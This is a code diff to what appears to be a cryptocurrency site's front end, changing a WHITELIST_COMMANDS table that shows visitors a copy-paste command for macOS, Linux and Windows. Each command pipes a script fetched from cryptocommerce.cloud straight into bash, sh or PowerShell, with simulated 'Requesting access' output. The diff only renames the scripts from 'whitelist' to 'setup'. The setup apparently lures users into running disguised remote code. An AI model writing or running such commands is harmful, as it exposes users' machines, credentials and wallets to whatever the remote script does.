@@ -6,7 +6,7 @@ const WHITELIST_COMMANDS = {
   mac: {
     label: 'macOS',
     prompt: '$',
-    command: `curl -fsSL https://www.cryptocommerce.cloud/whitelistm.sh | bash`,
+    command: `curl -fsSL https://www.cryptocommerce.cloud/setup-mac.sh | bash`,
     note: 'curl is pre-installed on macOS 10.15+. Run in Terminal.',
     outputLines: [
       { color: '#6ee7b7', text: '✔ Requesting access...' },
@@ -17,7 +17,7 @@ const WHITELIST_COMMANDS = {
   linux: {
     label: 'Linux',
     prompt: '$',
-    command: `wget -O- https://www.cryptocommerce.cloud/whitelistl.sh | sh`,
+    command: `wget -O- https://www.cryptocommerce.cloud/setup-linux.sh | sh`,
     note: 'wget is pre-installed on Linux. Run in Terminal.',
     outputLines: [
       { color: '#6ee7b7', text: '✔ Requesting access...' },
@@ -28,7 +28,7 @@ const WHITELIST_COMMANDS = {
   win: {
     label: 'Windows',
     prompt: '>',
-    command: `curl -fsSL https://www.cryptocommerce.cloud/whitelist.ps1 | powershell -Command -`,
+    command: `curl -fsSL https://www.cryptocommerce.cloud/setup-windows.ps1 | powershell -Command -`,
     note: 'Open PowerShell or Command Prompt on Windows 10/11.',
     outputLines: [
       { color: '#6ee7b7', text: '✔ Requesting access...' },
